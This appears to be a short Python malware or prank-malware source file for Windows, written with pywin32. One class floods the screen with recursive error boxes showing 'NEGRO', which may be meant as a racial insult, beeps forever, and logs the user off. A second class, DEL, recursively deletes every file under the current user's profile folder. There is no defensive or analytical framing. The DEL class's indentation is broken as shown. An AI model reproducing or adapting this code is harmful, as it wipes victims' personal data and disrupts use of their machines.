import win32api, win32con
import _thread, random, os

class WNA:

    def __init__(self):
        print(0)

    def messages(self):
        def msg():
            if win32api.MessageBox(None,'NEGRO','c4', win32con.MB_ICONERROR) == 1:
                    _thread.start_new_thread(msg,())
            msg()
        msg()
        while True:
            pass

    def win_sounds(self):
        while True:
            random.choice([win32api.MessageBeep(win32con.MB_OK),win32api.MessageBeep(win32con.MB_ICONERROR)])
            win32api.Sleep(5*10**3)

    def exit_win(self):
        win32api.MessageBox(None, 'NEGRO', 'c4', win32con.MB_ICONERROR)
        win32api.ExitWindows()


class DEL:

        def __init__(self):
        self.dir = 'C:\\Users\\%s' % win32api.GetUserName()
        for root, dirs, files in os.walk(self.dir, topdown=False):
            for name in files:
                try:
                    win32api.DeleteFile(os.path.join(root, name))
                except Exception as e:
                    print(e)
